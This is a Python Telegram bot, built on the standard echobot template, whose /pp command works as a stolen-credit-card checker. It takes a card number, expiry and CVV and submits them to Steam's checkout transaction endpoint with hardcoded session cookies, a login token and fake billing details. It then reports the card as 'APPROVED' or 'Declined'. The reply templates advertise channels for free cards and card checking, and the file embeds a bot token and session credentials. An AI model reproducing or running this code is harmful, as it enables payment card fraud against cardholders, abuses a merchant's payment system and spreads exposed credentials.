#!/usr/bin/env python
# pylint: disable=unused-argument
# This program is dedicated to the public domain under the CC0 license.

"""
Simple Bot to reply to Telegram messages.

First, a few handler functions are defined. Then, those functions are passed to
the Application and registered at their respective places.
Then, the bot is started and runs until we press Ctrl-C on the command line.

Usage:
Basic Echobot example, repeats messages.
Press Ctrl-C on the command line or send a signal to the process to stop the
bot.
"""

import logging
import requests
from datetime import datetime
from requests import Request, Session


from telegram import ForceReply, Update
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters

# Enable logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)

# set higher logging level for httpx to avoid all GET and POST requests being logged
logging.getLogger("httpx").setLevel(logging.WARNING)
logger = logging.getLogger(__name__)

last_call = datetime.now()

# Define a few command handlers. These usually take the two arguments update and
# context.


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Send a message when the command /start is issued."""
    user = update.effective_user
    await update.message.reply_html(
        rf"Hi {user.mention_html()}!",
        reply_markup=ForceReply(selective=True),
    )


async def hello(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text(f'Hello {update.effective_user.first_name}')


async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Send a message when the command /help is issued."""
    global last_call

    cc = update.message.text.lstrip("/pp").strip()
    cc_infos = cc.split("|")

    if len(cc_infos) == 4 and len(cc_infos[0]) == 16 and len(cc_infos[1]) == 2 and len(cc_infos[2]) == 2 and len(cc_infos[3]) == 3:

        time_delta_obj = datetime.now() - last_call
        diff_in_mins = int(time_delta_obj.total_seconds()/60)
        waiting_mins = 3

        if diff_in_mins < waiting_mins:
            await update.message.reply_text("Try again after " + str(waiting_mins - diff_in_mins) + " minutes")
        else:
            last_call = datetime.now()
            url = 'https://checkout.steampowered.com/checkout/inittransaction/'
            raw_data = {'gidShoppingCart': '-1',
                        'gidReplayOfTransID': '-1',
                        'bUseAccountCart': '1',
                        'PaymentMethod': 'visa' if cc_infos[0][0] == "4" else "master",
                        'abortPendingTransactions': '0',
                        'bHasCardInfo': '1',
                        'CardNumber': cc_infos[0],
                        'CardExpirationYear': '20' + cc_infos[2],
                        'CardExpirationMonth': cc_infos[1],
                        'FirstName': 'cuong',
                        'LastName': 'guong',
                        'Address': 'hanoi',
                        'AddressTwo': '',
                        'Country': 'VN',
                        'City': '00000',
                        'State': '',
                        'PostalCode': '00000',
                        'Phone': '%2B84973621400',
                        'ShippingFirstName': '',
                        'ShippingLastName': '',
                        'ShippingAddress': '',
                        'ShippingAddressTwo': '',
                        'ShippingCountry': 'VN',
                        'ShippingCity': '',
                        'ShippingState': '',
                        'ShippingPostalCode': '',
                        'ShippingPhone': '',
                        'bIsGift': '0',
                        'GifteeAccountID': '0',
                        'GifteeEmail': '', 'GifteeName': '',
                        'GiftMessage': '', 'Sentiment': '',
                        'Signature': '', 'ScheduledSendOnDate': '0',
                        'BankAccount': '',
                        'BankCode': '', 'BankIBAN': '',
                        'BankBIC': '', 'TPBankID': '',
                        'BankAccountID': '', 'bSaveBillingAddress': '1',
                        'gidPaymentID': '', 'bUseRemainingSteamAccount': '0',
                        'bPreAuthOnly': '0',
                        'sessionid': 'f9c8300f73ca66933d33d671'}

            headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", 
            "cookie": "beginCheckoutCart=-1; browserid=3766782376100557103; sessionid=f9c8300f73ca66933d33d671; timezoneOffset=25200,0; steamCountry=VN%7C84eb582c4ba621fe799c90318422c30e; ak_bmsc=0864DCB2486E3F123E7F25807AF9F200~000000000000000000000000000000~YAAQLdgjF1M47ueQAQAAbvnn8Rif8UpAqW7CpjprUeZBXd4YLSjpwRiPsN1nnAqF9KsV4Nu33CcqYsCeTB4OYYBGtwfeK7e++WeoPUC0UJ5wS/cMIgkhkDIGRjFHUqhDrW/+QhwBUAIhRiqfooYrc/X2BB/OZ9Q0591vWajvOtiac/FH2T5j02nkSs6il87czeuh9hKqiBIJTx4hu0LT2uK/ZH/NSpvE5lI2q8ppt/pAvYxuEPSsumYOc/rt1KPt7xBg0m3miWLPxpmhLdH4sUbCWK4yF3ucCVEzQTr+x3y8A4dTUk08+qZNNT30UL8DQ4qw+8Er4pDyxsH6ip9LaJXYxANBKC087bOoA6/vq9nqn6ZExJrAp6MewFpTPhTDPP37top1; steamLoginSecure=76561199749494830%7C%7CeyAidHlwIjogIkpXVCIsICJhbGciOiAiRWREU0EiIH0.eyAiaXNzIjogInI6MEY3Rl8yNEM5RDI0N18zRUI5RCIsICJzdWIiOiAiNzY1NjExOTk3NDk0OTQ4MzAiLCAiYXVkIjogWyAid2ViOmNoZWNrb3V0IiBdLCAiZXhwIjogMTcyMjEzMTk4OCwgIm5iZiI6IDE3MTM0MDU0MjksICJpYXQiOiAxNzIyMDQ1NDI5LCAianRpIjogIjBGOENfMjRDREQ2QTlfNDkzMTAiLCAib2F0IjogMTcyMjA0NTQyOSwgInJ0X2V4cCI6IDE3NDAxMjE5MjcsICJwZXIiOiAwLCAiaXBfc3ViamVjdCI6ICIxMDQuMjguMjIyLjc1IiwgImlwX2NvbmZpcm1lciI6ICIxMDQuMjguMjIyLjc1IiB9.ehVUOcYfmthUXi_410YU4qWH2TxGjfyfY0k2QccxS8OH13BeQeSDP3p3TuPx0nuURYe531ST2b_L1ez2az8zCA"}
            response = requests.post(url, headers=headers, data=raw_data)
            declined_result = """⚜️Card ➔  """ + cc + """
⚜️Status ➔  𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌ 
⚜️Gateway ➔   Paypal 0.1 $ 
⚜️Response ➔  
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
⚜️Bank Info ➔   Pnc Bank, National Association 
⚜️Country ➔  United States of America (the) 🇺🇸
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
⚜️Free Bins ➔ @BinPost
⚜️Free CCs ➔ @RandomCreditCards
⚜️Buy ➔  @PremiumChecker"""
            approved_result = """
✨Card ➔ """ + cc + """
✨Status ➔  APPROVED ⚡️ 
✨Gateway ➔   Paypal 0.1 $ 
✨Response ➔ VALID_BILLING_ADDRESS ✅
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
✨Bin ➔ VISA;CREDIT;PLATIUM
✨Bank Info ➔   AU  Bank 
✨Country ➔  Australia
 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

"""
            await update.message.reply_text(approved_result if response.json()["success"] == 1 else declined_result)
    else:
        await update.message.reply_text("Credit card is not correct " + cc)


async def echo(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Echo the user message."""
    await update.message.reply_text(update.message.text)


def main() -> None:
    """Start the bot."""
    # Create the Application and pass it your bot's token.
    application = Application.builder().token(
        "7437575787:AAGTMpWsOP1lo1gEEhEBPUvMzHbdJ0_qFJw").build()

    # on different commands - answer in Telegram
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("hello", hello))
    application.add_handler(CommandHandler("pp", check_command))

    # on non command i.e message - echo the message on Telegram
    application.add_handler(MessageHandler(
        filters.TEXT & ~filters.COMMAND, echo))

    # Run the bot until the user presses Ctrl-C
    application.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
